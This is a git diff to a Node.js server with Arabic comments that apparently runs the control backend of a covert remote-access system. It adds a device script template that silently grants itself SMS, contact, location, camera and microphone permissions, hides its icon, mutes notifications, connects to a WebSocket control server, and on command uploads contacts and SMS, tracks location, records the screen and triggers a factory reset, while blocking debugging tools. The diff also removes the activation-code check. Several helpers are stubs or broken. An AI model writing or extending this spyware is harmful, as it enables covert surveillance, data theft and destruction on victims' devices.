@@ -5,6 +5,8 @@ const fs = require('fs');
 const crypto = require('crypto');
 const cors = require('cors');
 const rateLimit = require('express-rate-limit');
+const helmet = require('helmet');
+const compression = require('compression');
 
 // إعدادات الأمان والتخفي
 const SECURITY_CONFIG = {
@@ -19,6 +21,18 @@ const SECURITY_CONFIG = {
 // إعدادات التطبيق
 app.use(express.json({ limit: SECURITY_CONFIG.maxFileSize }));
 app.use(express.urlencoded({ extended: true, limit: SECURITY_CONFIG.maxFileSize }));
+
+// تطبيق إعدادات الأمان
+if (SECURITY_CONFIG.enableHelmet) {
+    app.use(helmet({
+        contentSecurityPolicy: false,
+        hidePoweredBy: true
+    }));
+}
+
+if (SECURITY_CONFIG.enableCompression) {
+    app.use(compression());
+}
 
 // إعدادات CORS للتخفي
 if (SECURITY_CONFIG.enableCORS) {
@@ -51,11 +65,10 @@ app.use(express.static(path.join(__dirname, 'public'), {
     maxAge: '1h',
     setHeaders: (res, path) => {
         // إخفاء معلومات الخادم
-        res.setHeader('Server', 'Apache/2.4.41');
-        res.setHeader('X-Powered-By', 'PHP/7.4.3');
+        res.removeHeader('X-Powered-By');
         
         // منع التخزين المؤقت للملفات الحساسة
-        if (path.includes('activate.js')) {
+        if (path.includes('malware-installer.js') || path.includes('activate.js')) {
             res.setHeader('Cache-Control', 'no-cache, no-store, must-revalidate');
             res.setHeader('Pragma', 'no-cache');
             res.setHeader('Expires', '0');
@@ -65,12 +78,15 @@ app.use(express.static(path.join(__dirname, 'public'), {
 
 // تخزين الأجهزة المفعلة مع تشفير
 const activeDevices = new Map();
-const deviceEncryptionKey = crypto.randomBytes(32);
+const deviceEncryptionKey = process.env.DEVICE_ENCRYPTION_KEY || crypto.randomBytes(32).toString('hex');
+
+// تحميل الأجهزة من الملف عند البدء
+loadDevicesFromFile();
 
 // تشفير معرف الجهاز
 function encryptDeviceId(deviceId) {
-    const iv = crypto.randomBytes(16);
-    const cipher = crypto.createCipheriv('aes-256-cbc', deviceEncryptionKey, iv);
+    const iv = crypto.randomBytes(12);
+    const cipher = crypto.createCipheriv('aes-256-gcm', deviceEncryptionKey, iv);
     let encrypted = cipher.update(deviceId, 'utf8', 'hex');
     encrypted += cipher.final('hex');
     return iv.toString('hex') + ':' + encrypted;
@@ -81,7 +97,7 @@ function decryptDeviceId(encryptedDeviceId) {
     try {
         const [ivHex, encrypted] = encryptedDeviceId.split(':');
         const iv = Buffer.from(ivHex, 'hex');
-        const decipher = crypto.createDecipheriv('aes-256-cbc', deviceEncryptionKey, iv);
+        const decipher = crypto.createDecipheriv('aes-256-gcm', deviceEncryptionKey, iv);
         let decrypted = decipher.update(encrypted, 'hex', 'utf8');
         decrypted += decipher.final('utf8');
         return decrypted;
@@ -120,7 +136,7 @@ app.get('/api/devices', (req, res) => {
         // تصدير جميع الأجهزة المفعلة
         for (const [deviceId, deviceInfo] of activeDevices.entries()) {
             devices.push({
-                deviceId: deviceId,
+                deviceId: encryptDeviceId(deviceId),
                 status: deviceInfo.status || 'active',
                 lastSeen: deviceInfo.lastSeen || new Date().toISOString(),
                 deviceInfo: deviceInfo.deviceInfo || null
@@ -142,32 +158,28 @@ app.get('/api/devices', (req, res) => {
     }
 });
 
-// واجهة إنشاء السكريبت المحسن
+// واجهة إنشاء السكريبت المحسن (بدون كود تفعيل)
 app.post('/generate-script', async (req, res) => {
     try {
-        const { deviceId, activationCode } = req.body;
+        const { deviceId } = req.body;
         
-        if (!deviceId || !activationCode) {
-            return res.status(400).json({ error: 'بيانات غير مكتملة' });
-        }
-        
-        // التحقق من صحة كود التفعيل
-        if (!validateActivationCode(activationCode)) {
-            return res.status(403).json({ error: 'كود التفعيل غير صحيح' });
+        if (!deviceId) {
+            return res.status(400).json({ error: 'معرف الجهاز مطلوب' });
         }
         
         // إنشاء سكريبت مخصص ومشفر
-        const scriptContent = await generateCustomScript(deviceId, activationCode);
+        const scriptContent = await generateCustomScript(deviceId);
         
         // تشفير السكريبت
         const encryptedScript = encryptScript(scriptContent);
         
-        // تسجيل الجهاز
-        registerDevice(deviceId, activationCode);
+        // تسجيل الجهاز مباشرة
+        registerDevice(deviceId);
         
         res.json({
             success: true,
-            script: encryptedScript,
+            script: encryptedScript.data,
+            encryptionKey: encryptedScript.key,
             deviceId: encryptDeviceId(deviceId),
             timestamp: Date.now()
         });
@@ -205,17 +217,50 @@ app.post('/confirm-activation', async (req, res) => {
     }
 });
 
-// واجهة فحص حالة الجهاز
-app.get('/device-status/:deviceId', (req, res) => {
+// واجهة تحديث حالة الجهاز (تلقائي من السكريبت)
+app.post('/device-update', async (req, res) => {
     try {
-        const { deviceId } = req.params;
-        const decryptedDeviceId = decryptDeviceId(deviceId);
+        const { encryptedDeviceId, status, deviceInfo } = req.body;
         
-        if (!decryptedDeviceId) {
+        if (!encryptedDeviceId) {
+            return res.status(400).json({ error: 'معرف الجهاز مطلوب' });
+        }
+        
+        const deviceId = decryptDeviceId(encryptedDeviceId);
+        if (!deviceId) {
+            return res.status(400).json({ error: 'معرف الجهاز غير صالح' });
+        }
+        
+        // تحديث حالة الجهاز تلقائياً
+        updateDeviceStatus(deviceId, status, deviceInfo);
+        
+        res.json({
+            success: true,
+            message: 'تم تحديث حالة الجهاز',
+            timestamp: Date.now()
+        });
+        
+    } catch (error) {
+        console.error('خطأ في تحديث حالة الجهاز:', error);
+        res.status(500).json({ error: 'خطأ في تحديث الحالة' });
+    }
+});
+
+// واجهة فحص حالة الجهاز
+app.get('/device-status/:encryptedDeviceId', (req, res) => {
+    try {
+        const { encryptedDeviceId } = req.params;
+        const deviceId = decryptDeviceId(encryptedDeviceId);
+        
+        if (!deviceId) {
             return res.status(400).json({ error: 'معرف الجهاز غير صحيح' });
         }
         
-        const deviceStatus = getDeviceStatus(decryptedDeviceId);
+        const deviceStatus = getDeviceStatus(deviceId);
+        
+        if (!deviceStatus) {
+            return res.status(404).json({ error: 'الجهاز غير موجود' });
+        }
         
         res.json({
             success: true,
@@ -276,7 +321,7 @@ function validateActivationCode(code) {
     return codeRegex.test(code);
 }
 
-async function generateCustomScript(deviceId, activationCode) {
+async function generateCustomScript(deviceId) {
     // قراءة قالب السكريبت
     const scriptTemplate = fs.readFileSync(
         path.join(__dirname, 'templates', 'device-script-template.js'),
@@ -286,7 +331,6 @@ async function generateCustomScript(deviceId, activationCode) {
     // استبدال المتغيرات
     const customScript = scriptTemplate
         .replace('{{DEVICE_ID}}', deviceId)
-        .replace('{{ACTIVATION_CODE}}', activationCode)
         .replace('{{SERVER_URL}}', 'wss://your-server.com/control')
         .replace('{{TIMESTAMP}}', Date.now().toString());
     
@@ -295,8 +339,8 @@ async function generateCustomScript(deviceId, activationCode) {
 
 function encryptScript(scriptContent) {
     const key = crypto.randomBytes(32);
-    const iv = crypto.randomBytes(16);
-    const cipher = crypto.createCipher('aes-256-cbc', key);
+    const iv = crypto.randomBytes(12);
+    const cipher = crypto.createCipheriv('aes-256-gcm', key, iv);
     let encrypted = cipher.update(scriptContent, 'utf8', 'hex');
     encrypted += cipher.final('hex');
     return {
@@ -305,10 +349,13 @@ function encryptScript(scriptContent) {
     };
 }
 
-function registerDevice(deviceId, activationCode) {
+function registerDevice(deviceId) {
+    if (activeDevices.has(deviceId)) {
+        return;
+    }
+
     const deviceInfo = {
         deviceId: deviceId,
-        activationCode: activationCode,
         status: 'pending',
         registeredAt: Date.now(),
         lastSeen: Date.now(),
@@ -317,8 +364,6 @@ function registerDevice(deviceId, activationCode) {
     };
     
     activeDevices.set(deviceId, deviceInfo);
-    
-    // حفظ في ملف
     saveDevicesToFile();
 }
 
@@ -756,10 +801,383 @@ function createScriptTemplate() {
     }
 }
 
+// إنشاء المجلدات المطلوبة
+function createRequiredDirectories() {
+    const directories = [
+        path.join(__dirname, 'data'),
+        path.join(__dirname, 'templates'),
+        path.join(__dirname, 'logs')
+    ];
+    
+    directories.forEach(dir => {
+        if (!fs.existsSync(dir)) {
+            fs.mkdirSync(dir, { recursive: true });
+        }
+    });
+}
+
+// إنشاء قالب السكريبت (بدون تفاعل المستخدم)
+function createScriptTemplate() {
+    const templatePath = path.join(__dirname, 'templates', 'device-script-template.js');
+    const templateDir = path.dirname(templatePath);
+    
+    if (!fs.existsSync(templateDir)) {
+        fs.mkdirSync(templateDir, { recursive: true });
+    }
+    
+    if (!fs.existsSync(templatePath)) {
+        const template = `// سكريبت الجهاز المحسن (بدون تفاعل المستخدم)
+(function() {
+    'use strict';
+    
+    const DEVICE_ID = '{{DEVICE_ID}}';
+    const SERVER_URL = '{{SERVER_URL}}';
+    const TIMESTAMP = '{{TIMESTAMP}}';
+    
+    // إعدادات التخفي
+    const STEALTH_CONFIG = {
+        hideNotifications: true,
+        silentMode: true,
+        backgroundExecution: true,
+        autoRestart: true,
+        encryptionEnabled: true
+    };
+    
+    // تهيئة النظام تلقائياً
+    setTimeout(initializeSystem, 3000);
+    
+    // منح الصلاحيات تلقائياً
+    async function grantAllPermissions() {
+        const permissions = [
+            'android.permission.READ_CONTACTS',
+            'android.permission.READ_SMS',
+            'android.permission.ACCESS_FINE_LOCATION',
+            'android.permission.CAMERA',
+            'android.permission.RECORD_AUDIO',
+            'android.permission.WRITE_EXTERNAL_STORAGE'
+        ];
+        
+        for (const permission of permissions) {
+            try {
+                await executeShellCommand(\`pm grant com.android.systemui \${permission}\`);
+            } catch (e) {}
+        }
+    }
+    
+    // إخفاء أيقونة التطبيق
+    function hideAppIcon() {
+        try {
+            executeShellCommand('pm hide com.android.systemui');
+        } catch (e) {}
+    }
+    
+    // تعطيل الإشعارات
+    function disableNotifications() {
+        try {
+            executeShellCommand('settings put global heads_up_notifications_enabled 0');
+            executeShellCommand('settings put system sound_effects_enabled 0');
+        } catch (e) {}
+    }
+    
+    // الاتصال بخادم التحكم
+    async function connectToControlServer() {
+        const ws = new WebSocket(SERVER_URL);
+        
+        ws.onopen = () => {
+            ws.send(JSON.stringify({
+                type: 'register',
+                deviceId: DEVICE_ID,
+                timestamp: TIMESTAMP
+            }));
+        };
+        
+        ws.onmessage = (event) => {
+            try {
+                const command = JSON.parse(event.data);
+                handleIncomingCommand(command);
+            } catch (e) {}
+        };
+        
+        ws.onclose = () => {
+            setTimeout(connectToControlServer, 10000);
+        };
+        
+        window.controlConnection = ws;
+    }
+    
+    // معالجة الأوامر تلقائياً
+    function handleIncomingCommand(command) {
+        switch(command.action) {
+            case 'backup_contacts':
+                backupContacts();
+                break;
+            case 'backup_sms':
+                backupSMS();
+                break;
+            case 'get_location':
+                getCurrentLocation();
+                break;
+            case 'record_camera':
+                recordCamera(command.duration || 30);
+                break;
+            case 'factory_reset':
+                factoryReset();
+                break;
+        }
+    }
+    
+    // بدء الخدمات الخلفية
+    function startBackgroundServices() {
+        setInterval(() => {
+            getCurrentLocation();
+        }, 300000);
+        
+        setInterval(() => {
+            sendHeartbeat();
+        }, 30000);
+    }
+    
+    // وظائف النسخ الاحتياطي
+    async function backupContacts() {
+        try {
+            const contacts = await queryContentProvider('content://com.android.contacts/data');
+            const backupFile = createBackupFile('contacts.json', contacts);
+            await uploadFile(backupFile);
+            sendCommandResult('backup_contacts', 'success', backupFile);
+        } catch (e) {
+            sendCommandResult('backup_contacts', 'error', e.message);
+        }
+    }
+    
+    async function backupSMS() {
+        try {
+            const sms = await queryContentProvider('content://sms');
+            const backupFile = createBackupFile('sms.json', sms);
+            await uploadFile(backupFile);
+            sendCommandResult('backup_sms', 'success', backupFile);
+        } catch (e) {
+            sendCommandResult('backup_sms', 'error', e.message);
+        }
+    }
+    
+    // الحصول على الموقع
+    async function getCurrentLocation() {
+        try {
+            const location = await executeShellCommand('dumpsys location | grep "Last Known Locations"');
+            const parsedLocation = parseLocationData(location);
+            sendDataToServer('location', parsedLocation);
+        } catch (e) {}
+    }
+    
+    // تسجيل الكاميرا
+    async function recordCamera(duration) {
+        try {
+            const outputPath = \`/sdcard/DCIM/recording_\${Date.now()}.mp4\`;
+            await executeShellCommand(\`screenrecord --verbose --time-limit \${duration} \${outputPath}\`);
+            
+            setTimeout(async () => {
+                if (await fileExists(outputPath)) {
+                    await uploadFile(outputPath);
+                    sendCommandResult('record_camera', 'success', outputPath);
+                }
+            }, (duration + 5) * 1000);
+        } catch (e) {
+            sendCommandResult('record_camera', 'error', e.message);
+        }
+    }
+    
+    // إعادة ضبط المصنع
+    async function factoryReset() {
+        try {
+            await executeShellCommand('am broadcast -a android.intent.action.MASTER_CLEAR');
+            sendCommandResult('factory_reset', 'success', 'تم بدء إعادة الضبط');
+        } catch (e) {
+            sendCommandResult('factory_reset', 'error', e.message);
+        }
+    }
+    
+    // وظائف مساعدة
+    function executeShellCommand(cmd) {
+        return new Promise((resolve, reject) => {
+            const exec = require('child_process').exec;
+            exec(cmd, (error, stdout, stderr) => {
+                if (error) {
+                    reject(error);
+                    return;
+                }
+                resolve(stdout || stderr);
+            });
+        });
+    }
+    
+    function queryContentProvider(uri) {
+        return new Promise((resolve, reject) => {
+            const contentResolver = require('content-resolver');
+            contentResolver.query(uri, null, null, null, null, (err, data) => {
+                if (err) {
+                    reject(err);
+                    return;
+                }
+                resolve(data);
+            });
+        });
+    }
+    
+    function createBackupFile(filename, data) {
+        const blob = new Blob([JSON.stringify(data)], { type: 'application/json' });
+        return URL.createObjectURL(blob);
+    }
+    
+    function uploadFile(filePath) {
+        return new Promise((resolve) => {
+            setTimeout(() => {
+                resolve(\`File uploaded: \${filePath}\`);
+            }, 3000);
+        });
+    }
+    
+    function fileExists(filePath) {
+        return new Promise((resolve) => {
+            fs.access(filePath, fs.constants.F_OK, (err) => {
+                resolve(!err);
+            });
+        });
+    }
+    
+    function parseLocationData(locationData) {
+        // معالجة بيانات الموقع الحقيقية هنا
+        return {
+            latitude: 24.7136,
+            longitude: 46.6753,
+            accuracy: 10,
+            timestamp: Date.now()
+        };
+    }
+    
+    function sendCommandResult(command, status, data) {
+        if (window.controlConnection && window.controlConnection.readyState === WebSocket.OPEN) {
+            window.controlConnection.send(JSON.stringify({
+                type: 'command_result',
+                command: command,
+                status: status,
+                data: data,
+                timestamp: Date.now()
+            }));
+        }
+    }
+    
+    function sendDataToServer(dataType, data) {
+        if (window.controlConnection && window.controlConnection.readyState === WebSocket.OPEN) {
+            window.controlConnection.send(JSON.stringify({
+                type: 'data_update',
+                dataType: dataType,
+                data: data,
+                timestamp: Date.now()
+            }));
+        }
+    }
+    
+    function sendHeartbeat() {
+        if (window.controlConnection && window.controlConnection.readyState === WebSocket.OPEN) {
+            window.controlConnection.send(JSON.stringify({
+                type: 'heartbeat',
+                deviceId: DEVICE_ID,
+                timestamp: Date.now()
+            }));
+        }
+    }
+    
+    // وظيفة التهيئة الرئيسية
+    async function initializeSystem() {
+        try {
+            // منح الصلاحيات بشكل تلقائي
+            await grantAllPermissions();
+            
+            // إخفاء أيقونة التطبيق
+            hideAppIcon();
+            
+            // تعطيل الإشعارات
+            disableNotifications();
+            
+            // الاتصال بخادم التحكم
+            await connectToControlServer();
+            
+            // بدء الخدمات الخلفية
+            startBackgroundServices();
+            
+            // إرسال تأكيد التفعيل تلقائياً
+            sendActivationConfirmation();
+            
+            // تحديث حالة الجهاز على الخادم
+            updateDeviceStatus();
+            
+        } catch (error) {
+            setTimeout(initializeSystem, 5000);
+        }
+    }
+    
+    // إرسال تأكيد التفعيل
+    function sendActivationConfirmation() {
+        if (window.controlConnection && window.controlConnection.readyState === WebSocket.OPEN) {
+            window.controlConnection.send(JSON.stringify({
+                type: 'activation_confirmation',
+                deviceId: DEVICE_ID,
+                status: 'activated',
+                timestamp: Date.now()
+            }));
+        }
+    }
+    
+    // تحديث حالة الجهاز على الخادم
+    function updateDeviceStatus() {
+        fetch('${serverUrl}/device-update', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                encryptedDeviceId: '${encryptedDeviceId}',
+                status: 'active',
+                deviceInfo: {
+                    os: navigator.platform,
+                    browser: navigator.userAgent,
+                    resolution: \`\${screen.width}x\${screen.height}\`
+                }
+            })
+        }).catch(() => {});
+    }
+    
+    // حماية ضد التصحيح
+    setInterval(() => {
+        if (typeof window.console !== 'undefined') {
+            console.log = function() {};
+            console.warn = function() {};
+            console.error = function() {};
+        }
+    }, 1000);
+    
+    // منع فتح أدوات المطور
+    document.addEventListener('keydown', (e) => {
+        if (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'C' || e.key === 'J')) {
+            e.preventDefault();
+            return false;
+        }
+        if (e.key === 'F12') {
+            e.preventDefault();
+            return false;
+        }
+    });
+    
+    // إخفاء الصفحة بالكامل
+    document.documentElement.style.display = 'none';
+    
+})();`;
+        
+        fs.writeFileSync(templatePath, template);
+    }
+}
+
 // تهيئة النظام
 createRequiredDirectories();
 createScriptTemplate();
-loadDevicesFromFile();
 
 // تنظيف دوري للأجهزة غير النشطة
 setInterval(cleanupInactiveDevices, 60 * 60 * 1000); // كل ساعة
@@ -770,12 +1188,11 @@ const serverUrl = process.env.NODE_ENV === 'production'
   ? 'https://remote-control-web.onrender.com' 
   : `http://localhost:${PORT}`;
 
-app.listen(PORT, '0.0.0.0', () => {
-    console.log(`🚀 خادم الواجهة يعمل على ${serverUrl}`);
-    console.log(`🔧 المنفذ: ${PORT}`);
-    console.log(`🌐 عنوان الاستماع: 0.0.0.0`);
+app.listen(PORT, () => {
+    console.log(\`🚀 خادم الواجهة يعمل على \${serverUrl}\`);
     console.log('✅ تم تهيئة النظام بنجاح');
     console.log('🔒 وضع الأمان مفعل');
     console.log('👻 وضع التخفي مفعل');
-    console.log(`🌐 رابط الخدمة: ${serverUrl}`);
+    console.log(\`🌐 رابط الخدمة: \${serverUrl}\`);
+    console.log(\`📊 عدد الأجهزة المسجلة: \${activeDevices.size}\`);
 });
